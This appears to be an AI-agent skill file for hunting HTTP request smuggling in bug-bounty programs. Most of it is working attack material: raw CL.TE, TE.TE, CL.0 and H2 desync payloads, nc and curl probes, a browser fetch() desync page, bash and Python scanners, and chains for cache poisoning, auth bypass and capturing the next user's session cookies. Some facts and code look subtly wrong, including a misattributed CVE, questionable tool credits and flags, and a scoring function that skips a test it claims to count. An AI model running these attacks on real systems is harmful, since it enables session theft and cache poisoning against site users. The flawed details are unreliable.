---
name: hunt-http-smuggling
description: "Hunt HTTP request smuggling (CL.TE, TE.CL, H2.CL, H2.TE). Cause: front-end proxy and back-end server disagree on where one request ends and the next begins (Content-Length vs Transfer-Encoding header parsing inconsistency). CL.TE: front-end uses CL, back uses TE → smuggle by sending TE: chunked but with body that fits CL count. TE.CL: opposite. H2.CL: HTTP/2 downgrade, smuggle CL into HTTP/1.1 back-end. Detection tools: Burp HTTP Request Smuggler extension, smuggler.py, h2csmuggler. Confirm: time-delay technique (smuggled GET with 30s timeout) — if front-end returns slow on next victim request, smuggling works. Validate: cache poisoning chain (smuggle request that gets cached for victim), credential theft (smuggle X-Forwarded-For override that captures next user's cookies), bypass auth (smuggled internal-path request). Real paid examples from major CDN deployments. Use when hunting H1 paid programs running CDN+origin stacks, when targeting load balancer / WAF bypass."
sources: portswigger_research, hackerone_public, field_recon
report_count: 9
---

## 17. HTTP REQUEST SMUGGLING
> Lowest dup rate. $5K–$30K. PortSwigger research by James Kettle.

### CL.TE (Content-Length front, Transfer-Encoding back)
```http
POST / HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### Detection
```
1. Burp extension: HTTP Request Smuggler
2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
3. Manual timing: CL.TE probe + ~10s delay = backend waiting for rest of body
```

### Impact Chain
```
Poison next request → access admin as victim
Steal credentials → capture victim's session
Cache poisoning → stored XSS at scale
```

---

## Target-Suitability Matrix (2026 reality check)

The classic CL.TE / TE.CL payloads are NOT universally exploitable in 2026. Modern proxies are RFC 9112 strict by default. Fingerprint the front-end BEFORE investing time.

| Front-end | CL.TE | TE.CL | H2.CL | H2.TE | Notes |
|---|---|---|---|---|---|
| **Nginx ≥ 1.21** | NO | NO | partial (H2 ingress) | partial | RFC-strict; rejects CL+TE with HTTP 400. Verified locally on Nginx 1.27 — all 9 documented variants killed by front-end ([docs/verification/phase2h-smuggling-cachepoison.md](../../docs/verification/phase2h-smuggling-cachepoison.md)). |
| **Caddy 2.x** | NO | NO | — | — | Hardened by default |
| **Envoy ≥ 1.20** | NO | NO | partial | partial | Hardened in most paths |
| **HAProxy ≤ 2.4** | ✓ | ✓ | — | — | **Vulnerable**, see CVE-2021-40346 |
| **AWS ALB + specific upstream** | partial | partial | ✓ | ✓ | Several disclosed-paid reports 2022-2024 |
| **Cloudflare → S3 / Lambda chains** | — | — | ✓ | ✓ | H2-downgrade attacks remain viable |
| **Older F5 BIG-IP (TMM < 16)** | ✓ | — | — | — | Vendor advisories |
| **Citrix ADC / NetScaler (older firmware)** | ✓ | ✓ | — | — | Disclosed in 2020-2022 |
| **Squid 3.x** | ✓ | — | — | — | Older deployments |
| **Apache Traffic Server (older)** | ✓ | ✓ | ✓ | ✓ | PortSwigger research |
| **Custom Python / Go proxies** | ✓ | ✓ | — | — | Frequently miss RFC enforcement |

### Operator fingerprint quick-check

```bash
curl -sI https://target/ | grep -i "Server:"
```

- `nginx/1.21+`, `Caddy`, `envoy` → CL/TE classic is dead — pivot to H2.CL/H2.TE if the front-end speaks HTTP/2, or look for legacy proxies upstream
- `HAProxy`, header points to AWS/CDN → run the full payload matrix
- No Server header → assume hardened, but run a single quick `space-before-colon` probe; if it doesn't 400, dig deeper

### H2.CL / H2.TE (the modern dominant vector)

H2-downgrade smuggling attacks rely on the front-end speaking HTTP/2 to the client and HTTP/1.1 to origin. The downgrade introduces CL/TE confusion because HTTP/2's frame-length headers don't survive the conversion cleanly. Most CDN+origin chains in 2024-2026 use this exact topology.

Tools that send HTTP/2 raw frames (Burp Pro's HTTP Request Smuggler extension, `h2csmuggler`, `smuggler.py`) are the right starting point against CDN-fronted targets. Avoid HTTP/1.1-only test clients (curl, raw sockets) against H2-front-ended targets — you'll send the wrong protocol entirely.

---

### CL.0 Desync (Content-Length ignored by backend)

Also called "CL.0" or "ignored Content-Length". The front-end reads Content-Length and forwards the body. The backend does NOT parse Content-Length — it reads until connection close. This leaves the body bytes dangling as the start of the next request on a keep-alive connection.

**Detection with raw socket:**

```bash
# CL.0 probe — send a POST with smuggled prefix after the body
# The backend ignores CL and treats the smuggled bytes as the next request
{
  echo -en 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nConnection: keep-alive\r\n\r\nSMUGGL'
  sleep 2
  echo -en 'GET /404 HTTP/1.1\r\nHost: target.com\r\nConnection: close\r\n\r\n'
} | nc -w 10 target.com 443
```

**Curl-based blind probe:**

```bash
# CL.0 timing probe: delay on backend indicates CL ignored
curl -s --raw -X POST "https://target.com/" \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 4" \
  -d $'x' \
  --max-time 15 \
  -w "\nHTTP_CODE: %{http_code}\nTIME: %{time_total}\n"
```

**When CL.0 is most likely:**
- Custom Go/Python/Rust backends that use `http.Handler` with `r.Body.Read` but don't enforce CL
- PHP-FPM behind a proxy (PHP ignores CL on POST when `max_input_vars` not hit)
- Server-Timing header leaks internal proxy processing

**Key indicator:** A POST request with mismatched CL that does NOT return HTTP 400. The backend swallowed a wrong Content-Length without complaint.

---

### H2.CL Desync (HTTP/2 → HTTP/1.1 CL Injection)

The attacker sends an HTTP/2 request containing a `content-length` header. The HTTP/2 front-end trusts its own frame-length to delimit the request and passes the CL header through to the HTTP/1.1 backend. The backend then uses the downgraded CL header for delimitation, while the front-end already consumed the full frame — creating a desync on the upstream HTTP/1.1 connection.

**Netflix $20k case study (HackerOne 2021-2022):**
- Researcher @defparam identified that Netflix's HTTP/2 termination layer forwarded `content-length` headers into HTTP/1.1 upstream connections
- The HTTP/2 frame length was 0 (no body), but the injected `content-length: 50` header told the backend to expect 50 more bytes
- Front-end forwarded the next request's bytes as the "body" of the smuggled request
- Impact: cache poisoning of Netflix's API responses, session hijacking on shared upstream connections
- Bounty: $20,000. Fixed by stripping `content-length` from all H2→H1.1 downgraded requests.

**Detection with h2csmuggler:**

```bash
# Install h2csmuggler
pip install h2csmuggler

# Probe H2.CL with a delay-based detector
h2csmuggler.py -x https://target.com --h2cl --method GET --path "/" \
  --smuggled-path "/api/internal/admin" \
  --smuggled-host "target.com" \
  --delay 5
```

**Manual Burp probe:**
1. Burp → Repeater → switch protocol to HTTP/2
2. Remove `:method` pseudo-header body length (set to 0)
3. Add `content-length: 100` as a regular header
4. Place the smuggled request in the `DATA` frame after the headers
5. Send → observe if a subsequent request triggers a 404 to `/smuggled-path`

---

### H2.TE Desync (HTTP/2 Transfer-Encoding Injection)

HTTP/2 officially removes `Transfer-Encoding` — it uses frame-length exclusively. But when a front-end downgrades H2→H1.1 and permits `transfer-encoding: chunked` to survive the conversion, the H1.1 backend uses TE and waits for chunk boundaries. The attacker sends a complete H2 frame (front-end satisfied) plus a chunked body that the backend never finishes reading → next request bytes consume the chunk body.

**AWS ALB case study (Albibir, 2023):**
- Researcher discovered that AWS Application Load Balancer (ALB) when configured with HTTP/2 listener → HTTP/1.1 target groups, would pass `transfer-encoding` headers from HTTP/2 requests into the HTTP/1.1 upstream
- ALB correctly terminated H2 using frame-length, but included TE: chunked in the H1.1 upstream request
- The Nginx/HTTPD origin would then interpret the body as chunked — 0\r\n\r\n ends the chunk, and subsequent bytes form a smuggled HTTP request
- Impact: full cache poisoning of ALB-cached responses, credential theft across ALB-connected microservices
- Disclosure: patched by AWS after confirmed reproduction — ALB now strips TE headers on downgrade
- Pattern similar to CVE-2022-22963 (Spring Cloud Function) leveraging proxy desync

**Detection:**

```bash
# H2.TE probe with h2csmuggler
h2csmuggler.py -x https://target.com --h2te --method POST --path "/" \
  --body "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n" \
  --delay 10

# Manual H2.TE via Burp (Repeater → HTTP/2):
# 1. Add header: transfer-encoding: chunked
# 2. Body: "0\r\n\r\nGET /404 HTTP/1.1\r\nHost: target.com\r\n\r\n"
# 3. The DATA frame has full body, but backend reads chunked encoding
# 4. Follow with a real GET / → expect 404 for /404
```

**When ALB is vulnerable:**
- ALB listener protocol: HTTPS (HTTP/2)
- Target group protocol: HTTP/1.1
- Origin server parsing chunked encoding on keep-alive connections
- Verify with: `curl -si https://target/ | grep -i "server:"` — if no explicit ALB header, test anyway

---

### TE.TE Obfuscation (Header Smuggling)

When both front-end and back-end support Transfer-Encoding, but parse the header differently, obfuscation variants can make one side see TE while the other ignores it.

**Variant matrix:**

| Variant | Header | Front-end behavior | Back-end behavior |
|---------|--------|-------------------|-------------------|
| Chunked + space | `Transfer-Encoding : chunked` | Space after name → ignores TE | Reads TE correctly |
| Tab injection | `Transfer-Encoding:\tchunked` | Tab before value → skips TE | Reads chunked |
| Double header | `Transfer-Encoding: x` + `Transfer-Encoding: chunked` | Picks first → skips | Picks last → uses chunked |
| x-chunked | `Transfer-Encoding: xchunked` | No match → no TE | Tolerant → reads chunked |
| Random padding | `Transfer-Encoding: chunked\r\nTransfer-Encoding: identity` | Takes first (identity) → no TE | Takes last (chunked) → TE |
| Pre-header junk | `Transfer-Encoding:\r\n chunked` | Line folding → ignores | Reads as chunked |
| Obsolete line fold | `Transfer-Encoding:\r\n chunked` | RFC 7230 obsolete folding → ignore | Tolerant parsers accept |
| Mixed case | `Transfer-Encoding: ChuNkEd` | Strict lowercase check → ignores | Case-insensitive → accepts |

**Detection script:**

```bash
# TE.TE probe: tab injection
curl -s -X POST "https://target.com/" \
  -H "Transfer-Encoding:\tchunked" \
  -H "Content-Length: 4" \
  -d $'0\r\n\r\n' \
  -w "HTTP_CODE: %{http_code}\n" \
  --max-time 10

# TE.TE probe: space before colon
curl -s -X POST "https://target.com/" \
  -H "Transfer-Encoding : chunked" \
  -H "Content-Length: 4" \
  -d $'0\r\n\r\n' \
  -w "HTTP_CODE: %{http_code}\n"

# TE.TE probe: double header (front picks first, back picks last)
curl -s -X POST "https://target.com/" \
  -H "Transfer-Encoding: x" \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 4" \
  -d $'0\r\nSMUGGLED\r\n' \
  -w "HTTP_CODE: %{http_code}\n"

# TE.TE probe: X-chunked variant
curl -s -X POST "https://target.com/" \
  -H "Transfer-Encoding: xchunked" \
  -d $'0\r\n\r\nGET /404 HTTP/1.1\r\nHost: target.com\r\n\r\n' \
  --max-time 10
```

**Interpretation:**
- HTTP 400 on the obfuscated header → front-end is strict (RFC 9112-compliant)
- HTTP 200 but no desync → backend accepted TE but doesn't have the opposite parser behavior
- Timeout or follow-up request returns smuggled response → confirmed TE.TE desync

---

### Client-Side Desync (Browser-Powered Smuggling)

Discovered by James Kettle (PortSwigger, 2023). Instead of smuggling from a direct connection, the attacker uses a victim's browser to send a crafted POST request with `Connection: keep-alive` and a body that the proxy thinks is complete but the backend treats as partial. The browser's connection to the proxy is then poisoned — the victim's next request on that connection gets the smuggled response.

**Key difference from server-side desync:** The browser is the smuggler. The proxy and backend are the victims. No direct socket needed.

**Mechanism:**
1. Attacker hosts a page with `fetch('https://vuln-proxy/', { method: 'POST', body: '0\r\n\r\nGET /login HTTP/1.1\r\nHost: vuln-proxy\r\n\r\n', mode: 'cors' })` (or `no-cors` with `keepalive: true`)
2. Browser sends the POST. The front-end proxy considers the body consumed by Content-Length.
3. Backend reads the body using a different parser (or Connection: keep-alive with no CL) and sees the carriage returns as request boundaries.
4. Victim's next request (a real GET /index.html) lands after the smuggled prefix → response to the smuggled request gets returned to the victim.

**Detection:**

```bash
# Serve a test page that fires a desync probe from the browser
cat > /tmp/csd-test.html << 'EOF'
<!DOCTYPE html>
<html>
<body>
<script>
// Client-Side Desync probe — sends a POST with dangling body bytes
fetch('https://target.com/', {
  method: 'POST',
  mode: 'no-cors',  // keepalive needed for connection reuse
  keepalive: true,
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: '0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: target.com\r\nConnection: close\r\n\r\n'
});

// Follow-up fetch to see if connection was poisoned
setTimeout(() => {
  fetch('/dashboard')
    .then(r => r.text())
    .then(t => console.log('DASHBOARD RESPONSE:', t.substring(0, 200)));
}, 1000);
</script>
</body>
</html>
EOF

# Start a local server to serve the page
python3 -m http.server 8888 --directory /tmp/
# Then open http://localhost:8888/csd-test.html in a browser pointed at target
```

**Client-Side Desync prerequisites:**
- Proxy supports HTTP/1.1 keep-alive and connection reuse
- Backend does NOT consume the full body (CL ignored or chunking mismatch)
- Browser CORS policy allows `no-cors` + `keepalive: true` (always allowed)
- Victim browser must already have an open connection to the proxy (keep-alive pool)

**Detection via curl simulation:**

```bash
# Simulate what the browser sends — POST with body, then GET on same connection
{
  echo -en 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 30\r\nContent-Type: text/plain\r\nConnection: keep-alive\r\n\r\n'
  echo -en '0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: target.com\r\n'
  sleep 1
  echo -en 'GET /dashboard HTTP/1.1\r\nHost: target.com\r\nConnection: close\r\n\r\n'
} | nc -w 10 target.com 80
```

---

### HTTP Anomaly Rank (HA Rank)

A 0–5 scoring system to quantify a target's susceptibility to HTTP desync smuggling. Higher is more dangerous.

| Score | Label | Criteria | Action |
|-------|-------|----------|--------|
| **0** | Immune | RFC 9112 strict; returns 400 on any CL+TE combination; H2→H1.1 strips all body headers | Move on |
| **1** | Low | Returns 200 for CL+TE but no desync observed; H2 downgrade tested negative | Note and skip |
| **2** | Moderate | CL+TE accepted; timing probes show slight connection stutter; H2 desync negative | Run automated scanner |
| **3** | High | CL/CL.0 or TE obfuscation confirmed via timing probe; H2.CL or H2.TE shows partial desync | Full manual exploit chain |
| **4** | Critical | Desync confirmed with follow-up response capture on second request; cache poisoning possible | Drop everything. Full chain PoC |
| **5** | Emergency | Verified cache poisoning OR credential theft on production keep-alive pool; multiple upstream connections affected | Immediate disclosure report |

**Quick HA Rank calculator:**

```bash
# HA Rank automation (bash one-liner — run against target)
function ha_rank() {
  local t=$1
  local score=0
  # Test 1: CL+TE coexistence → does the server 400?
  curl -sk -m 10 -X POST "$t/" -H "Content-Length: 4" -H "Transfer-Encoding: chunked" -d $'x' -w "%{http_code}" | grep -q 400 && echo "CL+TE → 400 (RFC strict)" || { echo "CL+TE → accepted (+1)"; score=$((score+1)); }
  # Test 2: Timing desync probe
  timeout 15 curl -sk -X POST "$t/" -H "Transfer-Encoding: chunked" -d $'0\r\n\r\nGET / HTTP/1.1\r\nHost: x\r\n\r\n' -w "%{time_total}" 2>/dev/null | awk '{if ($1 > 5) print "Timing desync (+2)"; else print "No timing desync"}'
  # Test 3: TE.TE obfuscation (tab injection)
  curl -sk -m 10 -X POST "$t/" -H $'Transfer-Encoding:\tchunked' -d $'0\r\n\r\n' -w "%{http_code}" | grep -q 400 && echo "TE.TE tab → blocked" || echo "TE.TE tab → accepted (+1)"
  # Test 4: H2.CL if H2 available
  which h2csmuggler 2>/dev/null && h2csmuggler.py -x "$t" --h2cl --method GET --path "/" --delay 3 2>&1 | grep -q "VULNERABLE" && { echo "H2.CL vulnerable (+2)"; score=$((score+2)); }
  echo "--- HA Rank: $score/5 ---"
}
# Usage:
# ha_rank https://target.com
```

---

### Detection Methodology (Stack-Based Testing)

Match the test variant to the detected or assumed stack. Do NOT fire all payloads at every target — wasted requests burn recon time.

| Detected stack | Primary test | Secondary test | Skip |
|---------------|-------------|---------------|------|
| **nginx 1.21+** | H2.CL (if H2 enabled) | H2.TE | CL.TE, TE.CL, CL.0 |
| **Caddy 2.x** | H2.TE (H2 default) | — | All others |
| **HAProxy ≤ 2.4** | CL.TE | TE.CL, TE.TE obfuscation | H2 (no H2 support) |
| **Envoy 1.20+** | H2.CL (if H2 fronting) | CL.0 (custom upstream) | CL.TE, TE.CL |
| **AWS ALB** | H2.TE | H2.CL, CL.0 | CL.TE (ALB strips TE on H1) |
| **Cloudflare** | H2.CL (downgrade to origin) | H2.TE | CL.TE (CF edge is RFC strict) |
| **Akamai** | TE.TE obfuscation | H2.CL | CL.TE |
| **Fastly** | CL.0 (known Fastly behavior) | H2.TE | TE.CL |
| **Apache httpd 2.4** | TE.TE obfuscation | CL.TE | H2.CL (no native H2) |
| **Custom Go/Python proxy** | CL.0 | CL.TE, TE.TE | H2 unless confirmed |
| **Java/Tomcat behind proxy** | H2.TE | CL.0 | TE.CL (Tomcat rejects TE) |

**General workflow:**

```bash
# Step 1: Fingerprint the stack
curl -sI "https://target.com/" | grep -iE "^(server:|via:|x-powered-by:|x-served-by:|cf-ray:|akamai|fastly)"
# Or use httpx for stack detection
httpx -u "https://target.com/" -td -sc -server

# Step 2: Quick RFD (Request Fingerprint Detection) — does the endpoint return 400 on garbage?
curl -s -m 5 -X PURGE "https://target.com" -w "%{http_code}"  # 405 → alive; 400 → strict

# Step 3: Based on stack (table above), run primary and secondary probes
# Step 4: If timing delta > 3s on any probe, escalate to HA Rank scoring
# Step 5: On HA Rank ≥ 3, write the full exploit chain
```

---

### Tools

#### smuggler.py (PortSwigger / defparam)

The original Python3 CL.TE/TE.CL fuzzer. Supports multi-threaded scanning and auto-detection.

```bash
# Install
git clone https://github.com/defparam/smuggler.git /tools/smuggler
cd /tools/smuggler && pip install -r requirements.txt

# Basic scan — test all payloads against a target
python3 smuggler.py -u "https://target.com/" -m POST --timeout 10

# Specific variant scan
python3 smuggler.py -u "https://target.com/" -m POST --cl-te --timeout 15

# Output vulnerable requests to file for manual replay
python3 smuggler.py -u "https://target.com/" -m POST -o /tmp/smuggler_results.txt

# With custom header (e.g., bypassing WAF by doubling Host)
python3 smuggler.py -u "https://target.com/" -m POST -H "X-Forwarded-Host: evil.com"
```

**Limitations:** smuggler.py sends HTTP/1.1 only. It will NOT detect H2.CL or H2.TE variants. Always follow up with h2csmuggler for HTTP/2 targets.

#### h2csmuggler (Assetnote / VanTuynh)

HTTP/2 → HTTP/1.1 downgrade smuggling tool. Handles raw H2 frames.

```bash
# Install
git clone https://github.com/assetnote/h2csmuggler.git /tools/h2csmuggler
cd /tools/h2csmuggler && pip install -r requirements.txt

# H2.CL probe
python3 h2csmuggler.py -x "https://target.com" --h2cl --method GET --path "/" \
  --smuggled-path "/api/admin/users" --smuggled-host "internal.target.com"

# H2.TE probe
python3 h2csmuggler.py -x "https://target.com" --h2te --method POST --path "/login" \
  --body "0\r\n\r\nGET /debug HTTP/1.1\r\nHost: localhost\r\n\r\n"

# Test all H2 variants
python3 h2csmuggler.py -x "https://target.com" --test-all --delay 10

# Verbose output for debugging
python3 h2csmuggler.py -x "https://target.com" --h2cl -v
```

#### Burp Suite — HTTP Request Smuggler Extension

The gold standard for manual and automated testing. Requires Burp Suite Professional.

- **Install:** BApp Store → HTTP Request Smuggler (by PortSwigger)
- **Auto-scan:** Right-click request → Extensions → HTTP Request Smuggler → Smuggle Probe (CL.TE, TE.CL, TE.TE)
- **H2 scan:** Requires Burp 2023.12+ with HTTP/2 support enabled in Repeater
- **H2 smuggler tab:** Extensions → HTTP Request Smuggler → HTTP/2 Smuggler Configuration → select H2.CL or H2.TE
- **Turbo Intruder integration:** HTTP Request Smuggler can generate Turbo Intruder Python scripts for high-volume desync testing

**Pro tip:** Use the "Smuggle via HTTP/2 downgrade" option in Burp 2024+ to automate H2.CL/H2.TE without manually switching protocols.

#### Turbo Intruder (PortSwigger)

For high-speed desync brute-forcing — useful for finding which upstream connection pool is vulnerable.

```python
# Example Turbo Intruder script for H2.CL brute-force
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           engine=Engine.BURP2
                           )
    for i in range(100):
        engine.queue(target.req, i)
        engine.queue(target.req, i+100)

def handleResponse(req, interesting):
    if '404' in req.response or 'smuggled' in req.response:
        table.add(req)
```

#### CL.0 detection utility (Python)

Stand-alone CL.0 scanner when you need to test many targets quickly:

```python
#!/usr/bin/env python3
"""CL.0 desync scanner — test if backend ignores Content-Length."""
import socket, ssl, sys, time

def test_cl0(host, port=443, path="/"):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sock = socket.create_connection((host, port), timeout=10)
    ssock = ctx.wrap_socket(sock, server_hostname=host)

    # Probe: POST with CL but include a smuggled prefix
    probe = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 6\r\n"
        f"Connection: keep-alive\r\n\r\n"
        f"SMUGGL"
    )
    ssock.sendall(probe.encode())
    time.sleep(1)

    # Follow-up request
    follow = (
        f"GET /404 HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: close\r\n\r\n"
    )
    ssock.sendall(follow.encode())

    resp = b""
    while True:
        try:
            data = ssock.recv(4096)
            if not data:
                break
            resp += data
        except:
            break
    ssock.close()
    return resp

if __name__ == "__main__":
    resp = test_cl0(sys.argv[1], int(sys.argv[2]) if len(sys.argv)>2 else 443)
    if b"404" in resp and b"SMUGGL" in resp:
        print("[!] CL.0 confirmed — smuggled prefix reflected in response")
    else:
        print("[-] No CL.0 desync detected")
```

---

## Related Skills & Chains

- **`hunt-cache-poison`** — Smuggling + cache is the canonical critical chain; one smuggled request becomes the cached response for every subsequent victim. Chain primitive: CL.TE smuggle a request whose response body contains attacker HTML/JS → front-end cache stores it under a popular URL (`/`, `/login`) → de-sync poisoning where the smuggled request becomes the cached response for the next N victims, persisting for the cache TTL.
- **`hunt-auth-bypass`** — Smuggling reaches internal-only routes that the front-end WAF/auth-proxy filters out. Chain primitive: smuggle `GET /admin/users HTTP/1.1` past the front-end ACL that blocks external `/admin/*` → backend processes the smuggled request as if from a trusted internal source → bypass front-end auth by smuggling internal-routed request → admin data in the response queue.
- **`hunt-idor`** — Smuggling attaches the NEXT user's session cookies to an attacker-controlled request path. Chain primitive: smuggle `GET /api/me HTTP/1.1` with no cookies → backend pairs it with the next legitimate user's incoming connection cookies → victim's session cookie attached to attacker's smuggled request → attacker reads the response containing victim's PII/tokens.
- **`hunt-xss`** — Smuggling injects XSS payloads into the response stream of the next victim without ever appearing in a URL parameter. Chain primitive: smuggled request body contains reflected payload that the backend renders into the next response in the queue → next visitor to `/` receives attacker HTML inline → reflected XSS at every visitor without any URL parameter visible to them or to logs.
- **`security-arsenal`** — Reach for the smuggling payload bank (CL.TE / TE.CL / TE.TE obfuscations, H2.CL downgrade probes, h2csmuggler one-liners, Burp HTTP Request Smuggler extension config) and the time-delay confirmation template before manual hex-editing.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical: the smuggled-request effect MUST land on a request issued by a different client/session, not your own follow-up. A timing delta in your own browser alone is parser disagreement, not exploitable smuggling.
